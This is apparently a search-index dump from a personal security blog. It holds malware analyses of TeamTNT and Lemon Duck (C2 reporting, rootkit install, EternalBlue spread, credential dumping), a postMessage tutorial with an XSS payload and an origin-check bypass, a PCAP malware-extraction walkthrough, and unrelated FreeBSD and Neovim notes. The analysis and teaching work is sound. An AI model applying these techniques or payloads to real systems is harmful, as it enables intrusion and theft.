file command to determine what kind of file this is. It is 1488 lines of code 😐. I analyzed some parts of this bash script and I\u0026rsquo;ll explain some functionalities of it. In the last image, you can see line 4 send the output of the id command to Hackers C2. Also in the next few lines, you can see miner word multiple times which can be a good indicator we dealing with a CryptoMiner.\nAfter all these, It checks if Alibaba Cloud Monitoring Service is enabled or not (till line 140). After that it disable SELINUX, AppArmor and Aliyun. This Bash Malware use THIS SCRIPT for disabling Alibaba Cloud Monitoring Service.\nAfter all these functions, There are some URLs with jpg extension which are configs and miner, etc. The first URL (mid.jpg) was downloaded and it\u0026rsquo;s a gzip file. I renamed and extracted it, It\u0026rsquo;s compressed by tar again, So again decompressed it. It gives us 2 file named ([ext4] and [ext4.pid]). The main file is an ELF file and pid file is a JSON configuration file. We go further, in line 789 there is a DIA_TAR which is a base64 encoded variable. I decoded and saved it. It\u0026rsquo;s a gzip file. I decompressed it and it has 3 files (diamorphine.c, diamorphine.h, Makefile). It\u0026rsquo;s a ROOTKIT! Yeahhh!! It has some features like make a process invisible or privilege escalation, etc. It will compile by system as a so module and will execute. After all execution, etc., Malware makes a backdoor on the victim with SSH. Now Everything is done for running xmrig. It prints a TeamTNT logo and runs xmrig miner to mine monero. The malware also downloads some other files which I didn\u0026rsquo;t explain because I didn\u0026rsquo;t have much time to analyze them. Lazy as f\u0026ndash;k. After setup is completed it will download another shell script which is to complete cyber kill-chain. And it will again download a tool called pnscan that is for port scanning. In a nutshell, it\u0026rsquo;s a Miner and RAT for Linux systems. I uploaded these samples in any.run and you can download them to analyze it more. Tell me if you found some interesting thing.\n","permalink":"http://localhost:1313/posts/2021/teamtnt-miners-in-the-wild/","tags":["Malware","MalwareAnalysis","ReverseEngineering","Redis"],"title":"TeamTNT Miners in the Wild"},{"categories":null,"content":"I\u0026rsquo;ll discuss the postMessage feature and how it can be vulnerable by wrong way implementation. First I\u0026rsquo;m going to talk about what is postMessage feature actually, then we are going to code and use it, at the end we will take a look at vulnerabilities.\nWhat is postMessage? postMessage() is a feature introduced in HTML5 and you can use it in JavaScript. This feature lets you send data between different Window objects (it can be an iframe or window.open()).\nSame-Origin Policy (SOP) is a mechanism that blocks the cross-origin requests, It means if we request a resource that is not at the same origin, our request will send but the response will return an error. In a word Origin is:\nOrigin = Protocol + Domain + Port\nSOP Will return an error in response if one of the protocol, domain, or even port changes. postMessage provided a secure way that let you bypass this security mechanism.\nA postMessage() syntax is something like:\ntargetWindow.postMessage(message, targetOrigin, [transfer]); targetWindow: It\u0026rsquo;s the window that takes the message. Just that :). It can be one of the following Window:\nwindow.open(): This function spawn a new window. window.opener: A variable which reference to window that spawned. window.parent: It\u0026rsquo;s a reference to the parent of the current window or subframe. window.frames: Basically it just return an array of frames. frames are accessible by [interator] or simply call it [i] notation. HTMLIFrameElement.contentWindow: It returns a Window object of an \u0026lt;iframe\u0026gt; HTML. message: This is the data you want to send. The data will be serialized that this feature lets you send data objects like a charm. The data will deserialize in the postMessage receiver.\ntargetOrigin: In the second parameter of postMessage(), you can define the target (receiver) origin, also its value can be * that we will cover later in this post.\nData Sender Now we want to write a code that send a data to an iframe.\n┌────────────────────────────────┐ │ domain-a.com │ │ ┌─────────────────────────┐ │ │ │ │ │ │ │ │ │ │ │ \u0026lt;iframe\u0026gt; │ │ │ │ │ │ │ │ domain-b.com │ │ │ └─────────────────────────┘ │ │ │ │ ┌─────────────────────────┐ │ │ │Write message here... │ │ │ └─────────────────────────┘ │ │ │ │ ┌─────────────┐ │ │ │ Send Msg │ │ │ └─────────────┘ │ │ │ └────────────────────────────────┘ It\u0026rsquo;s so much easy. Right?! :)\nhxxp://domain-a.com/sender.html:\n\u0026lt;html\u0026gt; \u0026lt;head\u0026gt;\u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;form id=\u0026#34;form1\u0026#34; action=\u0026#34;/\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; id=\u0026#34;message\u0026#34; placeholder=\u0026#34;Write message here...\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;Send Msg\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;iframe id=\u0026#34;ifrm\u0026#34; src=\u0026#34;http://domain-b.com/receiver.html\u0026#34;\u0026gt; \u0026lt;script\u0026gt; window.onload=function() { var ifrmwindow = document.getElementById(\u0026#34;ifrm\u0026#34;).contentWindow; var form = document.getElementById(\u0026#34;form1\u0026#34;); var msg = document.getElementById(\u0026#34;message\u0026#34;).value; form.onsubmit = function() { ifrmwindow.postMessage(msg, \u0026#34;http://domain-b.com\u0026#34;); return false; } } \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; First, we take the Window object of the iframe and the message which we want to send, then we set a function() for onsubmit event of the form, that call postMessage() on the iframe Window object. You can also set * instead of http://domain-b.com. The * means this message can send to anyone, actually you can specify the origin in that, but we set it as * which means it could be anyone (any origin), sooo\u0026hellip; Never do that in the production stage. :))\nNow we need to code the receiver of postMessage(). I just want to write what receiver got in the page.\nhxxp://domain-b.com/receiver.html:\n\u0026lt;html\u0026gt; \u0026lt;head\u0026gt;\u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p id=\u0026#34;received-message\u0026#34;\u0026gt;Nothing got yet!\u0026lt;/p\u0026gt; \u0026lt;script\u0026gt; function displayMessage(event) { msg = \u0026#34;Message: \u0026#34; + event.data + \u0026#34;\u0026lt;br\u0026gt;Origin: \u0026#34; + event.origin; document.getElementById(\u0026#34;received-message\u0026#34;).innerHTML = message; } if (window.addEventListener) window.addEventListener(\u0026#34;message\u0026#34;, displayMessage, false); else window.attachEvent(\u0026#34;onmessage\u0026#34;, displayMessage); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; addEventListener() will wait for an event, if it receive an event it will call a function which specified. attachEvent() is like addEventListener() but instead for Internet Explorer and Opera. \u0026quot;message\u0026quot; is the type of event that we waiting for. displayMessage is a function which will be call when we get what we waiting for (\u0026quot;message\u0026quot;).\nNow we know how a postMessage() work. Let\u0026rsquo;s move on and explain what vulnerabilities may occur.\npostMessage Vulnerabilities Three vulnerabilities can occur in postMessage.\nSender Origin is set to * Receiver does not verify the origin of the sender Receiver does not sanitize the data which received The first one is obvious and we pointed out before. Now I want to show you how to abuse the second and third misconfigurations.\nAs we already discussed, receiver wait for an event (based on the type of addEventListener()) then a function will call, but we didn\u0026rsquo;t said who can send data to receiver?! It has a simple answer, EVERYONE!\nSo everone can send data to any receiver, It is on receiver own to check the sender origin, If it doesn\u0026rsquo;t, the receiver \u0026ldquo;event listener\u0026rdquo; will accept any event. It means an attacker also can send a malicious data to receiver. A secure way to fix this issue is checking the Origin. It just needs a if condition. Let\u0026rsquo;s explain by an example.\nhxxp://domain-b.com/receiver.html:\n\u0026lt;html\u0026gt; \u0026lt;head\u0026gt;\u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p id=\u0026#34;received-message\u0026#34;\u0026gt;Nothing got yet!\u0026lt;/p\u0026gt; \u0026lt;script\u0026gt; function displayMessage(event) { if (evt.origin.startsWith(\u0026#34;http://domain-a.com\u0026#34;) != true) { console.log(\u0026#34;Invalid Origin! Do Not try Hacking at home. :)\u0026#34;); } else { msg = \u0026#34;Message: \u0026#34; + event.data + \u0026#34;\u0026lt;br\u0026gt;Origin: \u0026#34; + event.origin; document.getElementById(\u0026#34;received-message\u0026#34;).innerHTML = message; } } if (window.addEventListener) window.addEventListener(\u0026#34;message\u0026#34;, displayMessage, false); else window.attachEvent(\u0026#34;onmessage\u0026#34;, displayMessage); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; I think it doesn\u0026rsquo;t need any explain. It just like the previous receiver, the only difference is an if condition. It checks if origin is started with \u0026ldquo;hxxp://domain-a.com\u0026rdquo;, If an attacker try to send a data with a \u0026ldquo;hxxp://attacker.com\u0026rdquo;, the receiver will write an error log. BUT, what if an attacker send a data by \u0026ldquo;hxxp://domain-a.com.attacker.com\u0026rdquo; domain?! Yeaaa\u0026hellip; Bypassed! The receiver will accept data. A secure way to implement is to check complete origin instead of startsWith or endsWith to compare a part of origin.\n\u0026lt;html\u0026gt; \u0026lt;head\u0026gt;\u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p id=\u0026#34;received-message\u0026#34;\u0026gt;Nothing got yet!\u0026lt;/p\u0026gt; \u0026lt;script\u0026gt; function displayMessage(event) { if (evt.origin != \u0026#34;http://domain-a.com\u0026#34;) { console.log(\u0026#34;Invalid Origin! Do Not try Hacking at home. :)\u0026#34;); } else { msg = \u0026#34;Message: \u0026#34; + event.data + \u0026#34;\u0026lt;br\u0026gt;Origin: \u0026#34; + event.origin; document.getElementById(\u0026#34;received-message\u0026#34;).innerHTML = message; } } if (window.addEventListener) window.addEventListener(\u0026#34;message\u0026#34;, displayMessage, false); else window.attachEvent(\u0026#34;onmessage\u0026#34;, displayMessage); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Now it is better! :)\nNow we get to the last misconfiguration. Consider a simple chatroom is implemented by the postMessage() functionality. There is a server which accept data from anywhere, It shows everyone data (message) that sent just like the first example that we implemented. The receiver shows the message by innerHTML JavaScript function.\nBreak (DOM-Base XSS) Cross-Site Scripting (a.k.a XSS) is a vulnerability that occur when user inputs reflect somewhere without sanitizing. It leds attacker to inject a script into the page that JavaScript is the most common one scripting language to exploit this vulnerability. XSS has different types:\nReflected Stored DOM There are also other types like mXSS or Self-XSS, But they are not an actual type, they can be one of the 3 main types. If you inject a JavaScript code into the vulnerable JavaScript code (which means it doesn\u0026rsquo;t need to send a request to server for injecting JavaScript), it\u0026rsquo;s a DOM-based XSS.\nBack to the Future (postMessage) innerHTML is one of the vulnerable Javascript property that leads to DOM-based XSS. As you can see in the first example of receiver.html, the received data (message) are displayed by innerHTML. So what now?! Just send \u0026lt;img src=x onerror=alert(1337)\u0026gt; and now we exploited a XSS vulnerability.\n","permalink":"http://localhost:1313/posts/2021/postmessage-vulnerabilities/","tags":["Web","WebHacking","PostMessage"],"title":"postMessage and Misconfigurations"},{"categories":null,"content":"A month ago I\u0026rsquo;ve got a Log from a company (we will call it victim corp from now) that it was detected as a malicios activity. What I\u0026rsquo;ve got from that report log was just an URL, Funny right?! :))\nI\u0026rsquo;ve start to google dork it. After some search and googling I\u0026rsquo;ve found some URLs and one of them was from app.any.run website which is one of the best sandbox for malware analysis and downloading samples. It seem it\u0026rsquo;s already analyzed; however, I didn\u0026rsquo;t hesitate and I started analyzing.\nI started collecting clues to figure out how to start my analysis. It seemed it started with some network communications so I started to look at them. Malware communicates with a domain which is hxxp://t[dot]awcna[dot]com/ipc[dot]jsp?h%22. The malware download and execute a Powershell script.\nThe downloaded Powershell script obfuscated multiple times. Obfuscation has been done using different techniques including replace() and Character Reversing.\nThe below picture shows the first stage of malware which is obfuscated.\nI\u0026rsquo;m not a Powershell pro so I need some research. :) During the research I\u0026rsquo;ve found a blog (tevora blog) that was quite helped me a lot and saved my time a lot.\nI\u0026rsquo;ve found the above code in the blog, So I used that! :) Finally\u0026hellip; (I know there is nothing important in the script as I already analyzed it, then I use an online website to show you defeated obfuscated mechanism)\nBut there is a problem! What the heck is that?! It is Reversed Code. :)) It is easy to defeat that! Just convert IEX() to Write-Output, Nah?!\nNow I convert it to Write-Output. Output is something like the below image.\nThe output is obfuscated again. I use the previous technique again.\nThe left window is the output. Obfuscated again... But I promise this is the last one. :)) Again\u0026hellip; and now obfuscated is defeated successfully. Yaaay. (But every stage is obfuscated like this one, so I\u0026rsquo;ll not cover them again).\nNow we can read the malware source code. In this stage the malware preparing for stage 0x02 (e.g. Define the variables), Also the malware creates two Tasks by schtasks which execute the script every 1H. Tasks\u0026rsquo; names are chosen randomly. The malware does this to ensure it will continue correctly.\nStage 0x02 (remind that it was obfuscated 😄) malware extract pieces of information about the infected system like OS type, OS version, Network Configuration and \u0026hellip; then sends it to the attacker C2 server. Attacker server response with a Powershell script which is stage 0x03 payload. The below image is a part of the stage 0x02 script.\nStage 0x03\u0026hellip; Again the malware extracts more information about the targeted system drivers and saves them to use later. The malware uses this information later to infect the connected drives like USB and External Hard Drive. Again some parameters will send to the attacker C2 server and stage 0x04 will download. In the next stage, some information and a currency miner will download to the victim system. To execute the currency miner, a Powershell process will be created hiddenly and by using the Invoke-ReflectivePEInjection from the PowerSploit module, the currency miner will inject into the PowerShell process. Since the process injection is Reflective, the file is not displayed in PowerShell sub-processes and is not easily detected.\nThe below image shows how the miner downloaded and injected into the process.\nIn the analysis, it was found that this malware, in addition to infecting the victim system, tries to infect and affect other network systems. In the final stage, the malware spreads on the network using various techniques. The malware first attempts to exploit an operating system with a vulnerable SMB version (RCE-type vulnerability) using the EternalBlue exploit from the Empire framework. The malware developer used some obfuscation mechanism on the EternalBlue exploit to bypass the AVs and EDRs. In the below image you can compare the original exploit and modified version (the left one is the original version).\nThe malware uses a tool called PingCastle to scan the network and enumerate. This module was developed by C#. The below image is the PingCastle script which is in the PowerShell script.\nThe malware uses a C# script to infect attached devices which were detected in the previous stage. The malware creates a lnk file in the attached devices.\nThis is so much huh?! There are more\u0026hellip; Wait! :)\nThe malware dumps the hash of the system by Powerdump that it takes from Nishang framework. It will use for PassTheHash (PTH) attack.\nAlso, a part of the stage 0x04 is dedicated to the Brute Force MsSql and RDP databases.\nif the malware finds the correct passwords, it will send them to the attacker C2 server.\nI have to point that the malware downloads a file which name is wf.cab and puts it in the %TEMP% folder and then it will extract it. Mimikatz and wfreerdp will extract from the wf.cab file. The Mimikatz use for PassTheHash (PTH) attack and the wfreerdp use for RDP attacks and backdoor.\nAfter the operations, dumped passwords and a report will send to the attacker.\nSome websites and blogs tagged this malware as a miner, But it is not just that simple! It\u0026rsquo;s a dangerous malware that can be an APT group behind that. And finally, this is my simple diagram for this malware.\n","permalink":"http://localhost:1313/posts/2021/lemon-duck-malware-analysis/","tags":["Malware","MalwareAnalysis","ReverseEngineering"],"title":"Lemon Duck Malware"},{"categories":null,"content":"I want to talk about How I detected and extracted PNG malware from a PCAP file.\nWhat we will cover in this post:\nIntroduction to Packet Analysis Introduction to Wireshark Detect Malicious Network Traffic Partial Content Responses Impact of Connection Problems Extract Malicious File from HTTP for analysis and Reverse Engineering Nowadays cyber attacks have become more sophisticated. The use of malware is increasing, Malware comes in many forms such as:\nTrojan Worms Viruses etc. A malware communicates with different domains and IP addresses for various reasons (e.g. Connect to C\u0026amp;C , Download the Real Malware , etc.). One of the steps of Malware Analysis is to examine these network connections.\nWe can analyze Malware network communications with different methods and tools, We can use some tools such as FakeNet or iNetSim to simulate and analyze outgoing connections, also we can analyze the captured network packets such as .pcap file, which can be analyzed by Wireshark .\nWireshark is a free and open-source packet analyzer. It is used for network troubleshooting, analysis, software and communications protocol development, and education.\nWireshark Application\nWireshark contains 3 windows, the top window (with the green bg colour) whose name is Packet List, the middle one (called the \u0026ldquo;Packet Details\u0026rdquo; window) and the bottom one (the \u0026ldquo;Packet Bytes\u0026rdquo; window).\nPacket List: Displays packets sent in a network interface. Packet Details: Displays the information and headers of a sent packet in details. Packet Bytes: This section displays the contents of a sent package in HEX and ASCII. I want to analyze malicious network communication (for a malware) from the PCAP file in this post. First, we\u0026rsquo;re going to open PCAP file (malware.pcap) in Wireshark, to do this, Select File -\u0026gt; Open from the menu bar. (or simply use Ctrl + O shortcut key).\nWhen you Open a PCAP file, depends on the system resources and PCAP size, it can take seconds or minutes to open.\nIt seems there are lots of packets in the PCAP file.\nSelect Statistics -\u0026gt; Capture File Properties from the menu bar (Shortcut: Ctrl+Alt+Shift+C) to see some information about PCAP file.\nIn the opened window, we can see how many packets captured and as already we guessed there is 931 packet.\nNow we must make a list of endpoints in the captured packets. to do this just select Statistics -\u0026gt; Endpoints from the menu bar.\nNow we can see endpoints, easy right?!\nWhat we have learned so far is that, there are so many endpoints and also we have 931 packets. Now we should determine what kind of connections do we have. To do this select Statistics -\u0026gt; Protocol Hierarchy from menu bar.\nIt seems most of the requests were DNS requests or HTTP requests.\nWe will now start reviewing some of the packets sent. As you can see in the top image, there are some media types connections. If we look at captured packets in-depth, we can find a word (.doc) document and an image with PNG extension.\nNote\nMalwares use different type of techniques to avoid detection by monitoring systems. One of these techniques is downloading a malicious file by a trojan with png, pdf, etc. file format.\nThe below image shows sent packets to download 78654543.png file. The first HEAD request is to ensure the file exists and then download of the image is started.\nBut WAIT! The response type from the server is 206 Partial Content! This status means that the file has a large size and the server divided it into small pieces (Segmentation) and send them. Right-click on one of the PNG requests and then select Follow -\u0026gt; HTTP Stream (Shortcut: Ctrl+Alt+Shift+H) also you can choose TCP Stream, it doesn\u0026rsquo;t make any difference here.\nAnother window will open which contains requests packets to download the PNG file. If you look at it carefully, you will see a suspicious thing, PNG is a Windows executable file. You can detect it with a file header \u0026ldquo;MZ\u0026rdquo;.\nSo this is a malicious request. We need to extract this file from captured requests to give it to malware analysts for in-depth analysis and reverse engineering to understand what does this malware. There are several ways to do it, One of the simple ways is to use Export Objects, Select File -\u0026gt; Export Objects -\u0026gt; HTTP from the menu bar.\nThe following window will open and the sent and received files by HTTP Protocol will be visible.\nAs you can see cause of the Partial Content response type, files are divided into multiple parts. The Files can be downloaded and merged, to download and save the files click on each part and select the Save button.\nIt seems part 4 had some trouble and it\u0026rsquo;s corrupted. I\u0026rsquo;m sure because in TCP Stream the fourth request is 12089 bytes but the fourth request in the top image is 24 KB.\nIf we check the Partial Content requests, We will see there is a problem in the fourth request and cause of TCP nature file downloaded twice.\nTo ensure that select Statistics -\u0026gt; I/O Graphs and you will see TCP errors.\nit seems Wireshark can\u0026rsquo;t detect these issues and fix errors, Then we need a way to fix this problem. Let\u0026rsquo;s Use Google/DuckDuckGo.\nOne of the result in google is a SANS paper which introduce ChaosReader.\nOne of the result in google is a SANS paper which introduces ChaosReader.\nTo try this tool, search it on google and download it.\nThis tool is written in Perl language. You will encounter an error while running the tool.\nThe root of the problem is the version used. Open ChaosReader file in an editor (like NeoVIM) and go to line 265 and make it a comment.\nSave the file and run it again. this time run it with --help switch to see the help page?! :)\nIt seems the tool needs a switch to run the whole process on a PCAP file. First, create a directory and move the PCAP file and ChaosReader file to it (because the output of the ChaosReader process is in the current directory and it is mess output :)). Run the tool with -e switch and give it the PCAP file name. The tool creates some HTML, HEX, and other types of files.\nThere is a file with index.html name in the directory of output, open it in browser (like Firefox, Chromium). According to the size and counts of the HTTP responses in a TCP session, we can guess the red box marked in the below image is for download Malicious PNG file. (You can use as_html or hex to see the content)\nNow we can download files with the .data extension or copy them from the output directory and then merged them as a file with the cat command in GNU/Linux or BSD.\nNow the malware is ready with the malware._exe name. All we need now is to open it in a reverse engineering tool like Radare2,IDA Pro, or Ghidra, etc.\nThe file seems OK and it\u0026rsquo;s a PE file. If you check the strings of the file, we see it is developed by C++ programming language. Now a malware analyst can reverse and analyze this. The rest of the process involves reverse engineering knowledge and malware analysis, and now a malware analyst can examine it.\n","permalink":"http://localhost:1313/posts/2021/extract-png-malware-from-pcap-file/","tags":["Malware","MalwareAnalysis","Pcap","Wireshark","TrafficAnalysis"],"title":"Extract PNG Malware from PCAP File"},{"categories":null,"content":" I\u0026rsquo;m a GNU/Linux user and I had Arch/Fedora/\u0026hellip; distributions for a while. I was passionate about BSDs especially FreeBSD. It has a devil-like logo (Beastie :)) which is cute and I like it. So I decided to share my experience when I installed it on my laptop as the main OS.\nAfter installation, I had a Terminal which is not a good idea when you\u0026rsquo;re using an OS as your daily/Personal OS, which made me install a GUI. We need root privilege to do some kinds of stuff so instead su command I prefer to use sudo, so I installed it first.\nSudo root# pkg install sudo root# visudo write invoxes ALL=(ALL) ALL in config file save and exit Now I can use sudo whenever i need root privilege. Now I\u0026rsquo;m going to install a Window Manager (WM) and I choose i3 WM. I\u0026rsquo;ve found a blog How to setup FreeBSD with a riced desktop | unixsheikh that explains how to install i3 on FreeBSD.\nI have a list of various apps that I always need them like VirtualBox, OpenVPN, etc. and my installation steps below. But it is good to know you can use ports to install these. I like portmaster to manage ports packages. It simply install with pkg.\nI have a few things to say before I start: Update ports packages index before using it.\nUpdate Ports sudo portsnap fetch sudo portsnap extract Then update it before install any package from it by sudo portsnap fetch update /etc/rc.conf vs /boot/loader.conf? loader.conf starts during boot while rc.conf starts after boot process. So do not add a driver/service/etc. load in both of them, because it is useless. When something is loaded during boot, it is not going to load again after boot process.\nPackages Installation Portmaster Install portmaster with pkg is simple.\nsudo pkg install portmaster now you can install package by portmaster tool from ports packages.\nsudo portmaster www/nginx You can remove distfiles with portmaster too.\nsudo portmaster --clean-distfiles VirtualBox sudo pkg install virtualbox-ose virtualbox-ose-additions Load vboxdrv Module with kldload vboxdrv To make sure Module is always load, add vboxdrv_load=\u0026quot;YES\u0026quot; and vboxnet_enable=\u0026quot;YES\u0026quot; to /etc/rc.conf pw groupmod vboxusers -m yourusername chown root:vboxusers /dev/vboxnetctl chmod 0660 /dev/vboxnetctl add below configuration into /etc/devfs.conf own vboxnetctl root:vboxusers perm vboxnetctl 0660 I had a problem with VirtualBox during Windows 10 installation and Windows 10 was stuck (froze) during installation, to fix that problem I\u0026rsquo;ve changed the storage device type from SATA Controller to IDE Controller from Settings -\u0026gt; Storage.\nOpenConnect sudo pkg install openconnect connect to vpn :) sudo openconnect --user=invoxes [VPN Address] Intel Grapric Driver If you did what How to setup FreeBSD with a riced desktop | unixsheikh did, you already installed it. :)\nsudo pkg install drm-kmod add kld_list=\u0026quot;/boot/modules/i915kms.ko\u0026quot; in /etc/rc.conf sudo pw groupmod video -m [username] reboot system and check i915kms is loaded or not (by kldstat) Configurations Touchpad: There are 3 different driver for trackpad. I didn\u0026rsquo;t try all of them but here is a Reddit Post which some experiences are shared by other guys. I use libinput, if you want to use libinput too, just follow my steps.\ncreate /usr/local/etc/X11/xorg.conf.d/90-touchpad.conf Write Config. Section \u0026#34;InputClass\u0026#34; Identifier \u0026#34;touchpad\u0026#34; MatchIsTouchpad \u0026#34;on\u0026#34; Driver \u0026#34;libinput\u0026#34; Option \u0026#34;Tapping\u0026#34; \u0026#34;on\u0026#34; EndSection challenge with External Hard Drive :)) I have an External Hard Drive and my backups and files are stored in that. I connected it to my laptop but FreeBSD didn\u0026rsquo;t recognized it. I\u0026rsquo;ve used ls to check External Hard Drive is detected or not and it was detected.\nls -l /dev/da*\nThen I used gpart to see my External Hard Drive details.\nCommand:\ngpart show /dev/da0 Output:\n=\u0026gt; 63 3907029105 da0 MBR (1.8T) 63 3907024002 1 ntfs (1.8T) 3907024065 5103 - free - (2.5M) Everything was ok. Before mount, We must load fusefs module by kldload fusefs command. Make sure it is loaded by kldstat | grep fuse command.\nIt is obvious if you want load it everytime, use rc.conf file. It was detected as NTFS so I tried to mount with below command:\nsudo mount -t ntfs-3g /dev/da0s1 /mnt but it failed!\nTo determine what kind of File System really is, I used fstyp command.\nCommand:\nsudo fstyp /dev/da0s1 Output:\nexfat Yep! It is exfat. Now I could mount it with below command:\nsudo mount.exfat-fuse /dev/da0s1 /mnt Now it worked! You can check it by ls -l /mnt command.\n","permalink":"http://localhost:1313/posts/2021/freebsd-journey/","tags":["BSD","FreeBSD"],"title":"My FreeBSD Journey"},{"categories":null,"content":"Installation I\u0026rsquo;m a Vim user but, I love to try new things and this time, I tried Neovim. Installation is so easy, I\u0026rsquo;m an Arch Linux user so it is easy as enter below command.\nsudo pacman -S neovim\nYou can check the Neovim Github for installation steps.\nWhen completed, you can run Neovim by nvim command.\nAs you can see it is so lightweight and a simple colorscheme. I want to install some plugins to make it more fasion.\nInstalling vim-plug First of all, I going to install vim-plug which make easier plugin installation process.\nYou can simply install it with below command:\nsh -c 'curl -fLo \u0026quot;${XDG_DATA_HOME:-$HOME/.local/share}\u0026quot;/nvim/site/autoload/plug.vim --create-dirs https://raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim'\nNow we need to enable this plugin, Open ~/.config/nvim/init.vim file (create if it isn\u0026rsquo;t exist), Insert below configuration into file:\ncall plug#begin(\u0026#39;~/.config/nvim/plugged\u0026#39;) call plug#end() ~/.config/nvim/plugged: Installed Plugin will goes here. (create it if it does\u0026rsquo;nt exist)\nBetween these 2 calls, We can handle our plugins to install/remove/\u0026hellip;.\nInstalling Dracula Colorscheme I want to install Dracula theme so I use Plug '' to install Dracula theme, I add Plug '' between 2 #call block:\n#call plug#begin(\u0026#39;~/.config/nvim/plugged\u0026#39;) Plug \u0026#39;dracula/vim\u0026#39;,{\u0026#39;as\u0026#39;:\u0026#39;dracula\u0026#39;} #call plug#end() dracula/vim: it\u0026rsquo;s username+/+repository_name (https://github.com/dracula/vim) .\n{\u0026lsquo;as\u0026rsquo;:\u0026lsquo;dracula\u0026rsquo;}: it gives a short name to that theme/plugin.\nThen open neovim by nvim command then use below command in command mode:\n:PlugInstall\nIt will install all plugin that is listed in #call block. I\u0026rsquo;ve added some more plugins to install.\nEnable Plugin/Colorscheme After all, now we need to enable colorscheme, to make this happen just add colorscheme [name of colorscheme] to init.vim file. Also it is recommended to use set termguicolors before choose a colorscheme.\nset termguicolors call plug#begin(\u0026#39;~/.config/nvim/plugged\u0026#39;) Plug \u0026#39;kyazdani42/blue-moon\u0026#39; Plug \u0026#39;cocopon/iceberg.vim\u0026#39; Plug \u0026#39;itchyny/lightline.vim\u0026#39; Plug \u0026#39;dracula/vim\u0026#39;,{\u0026#39;as\u0026#39;:\u0026#39;dracula\u0026#39;} Plug \u0026#39;Badacadabra/vim-archery\u0026#39; call plug#end() colorscheme dracula If you want to change colorscheme for example to archery, just change colorscheme value to archery.\nset termguicolors call plug#begin(\u0026#39;~/.config/nvim/plugged\u0026#39;) Plug \u0026#39;kyazdani42/blue-moon\u0026#39; Plug \u0026#39;cocopon/iceberg.vim\u0026#39; Plug \u0026#39;itchyny/lightline.vim\u0026#39; Plug \u0026#39;dracula/vim\u0026#39;,{\u0026#39;as\u0026#39;:\u0026#39;dracula\u0026#39;} Plug \u0026#39;Badacadabra/vim-archery\u0026#39; call plug#end() colorscheme archery Remove Plugin/Colorscheme To remove a plugin, just remove the Plug '' for that plugin and then run nvim, then enter :PlugClean in command mode of nvim.\n","permalink":"http://localhost:1313/posts/2021/first-experience-with-neovim/","tags":["Linux","Neovim","Vim"],"title":"First Experience with Neovim"},{"categories":null,"content":"How to I connected FreeBSD to my Android with ADB?\nmount_msdosfs?\nRun BurpSuite in FreeBSD?\nmixer / sysctl hw.snd.default_unit / /dev/sndstat file / test audio with /dev/dspX\npkg audit -F freebsd-update \u0026amp; freebsd-static\nchange $SHELL from classic sh to tcsh with chsh\npcmanfm\nxdg-mime default pcmanfm.desktop inode/directory\nxdg-mime default xpdf.desktop application/pdf\n","permalink":"http://localhost:1313/posts/freebsd-journey-part-2/","tags":null,"title":""},{"categories":null,"content":"postMessage and Misconfigurations I\u0026rsquo;ll discuss about postMessage feature and how it can be vulnerable by wrong way implementation. First I\u0026rsquo;m going to talk about what is postMessage feature actually, then we are going to code and use it, at the end we will take a look at vulnerabilities.\nWhat is postMessage? postMessage() is a feature that introduced in HTML5 and you can use it by JavaScript. This feature let you send data between different Window objects (it can be an iframe or window.open()).SOP is a mechanism which block the cross-origin requests, It means if we request a resource that is not in the same-origin, our request will send but the response will return an error. In a word Origin is:\nOrigin = Protocol + Domain + Port\nSOP Will return an error in response if one of the protocol, domain or even port change. postMessage provided a secure way that let you bypass this security mechanism.\nA postMessage() syntax is something like:\ntargetWindow.postMessage(message, targetOrigin, [transfer]); targetWindow: It\u0026rsquo;s the window that takes the message. Just that :). It can be one of the following Window:\nwindow.open(): This function spawn a new window. window.opener: A variable which reference to window that spawned. window.parent: It\u0026rsquo;s a reference to the parent of the current window or subframe. window.frames: Basically it just return an array of frames. frames are accessible by [interator] or simply call it [i] notation. HTMLIFrameElement.contentWindow: It returns a Window object of an \u0026lt;iframe\u0026gt; HTML. message: This is the data you want to send. The data will serialized that this feature let you send data objects like a charm. The data will deserialize in the postMessage receiver.\ntargetOrigin: In the second parameter of postMessage() you can define the target (receiver) origin, also its value can be * that we will cover it later in this post.\nData Sender Now we want to write a code that send a data to an iframe.\n┌────────────────────────────────┐ │ domain-a.com │ │ ┌─────────────────────────┐ │ │ │ │ │ │ │ │ │ │ │ \u0026lt;iframe\u0026gt; │ │ │ │ │ │ │ │ domain-b.com │ │ │ └─────────────────────────┘ │ │ │ │ ┌─────────────────────────┐ │ │ │Write message here... │ │ │ └─────────────────────────┘ │ │ │ │ ┌─────────────┐ │ │ │ Send Msg │ │ │ └─────────────┘ │ │ │ └────────────────────────────────┘ It\u0026rsquo;s so much easy. Right?! :)\nhxxp://domain-a.com/sender.html:\n\u0026lt;html\u0026gt; \u0026lt;head\u0026gt;\u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;form id=\u0026#34;form1\u0026#34; action=\u0026#34;/\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; id=\u0026#34;message\u0026#34; placeholder=\u0026#34;Write message here...\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;Send Msg\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;iframe id=\u0026#34;ifrm\u0026#34; src=\u0026#34;http://domain-b.com/receiver.html\u0026#34;\u0026gt; \u0026lt;script\u0026gt; window.onload=function() { var ifrmwindow = document.getElementById(\u0026#34;ifrm\u0026#34;).contentWindow; var form = document.getElementById(\u0026#34;form1\u0026#34;); var msg = document.getElementById(\u0026#34;message\u0026#34;).value; form.onsubmit = function() { ifrmwindow.postMessage(msg, \u0026#34;http://domain-b.com\u0026#34;); return false; } } 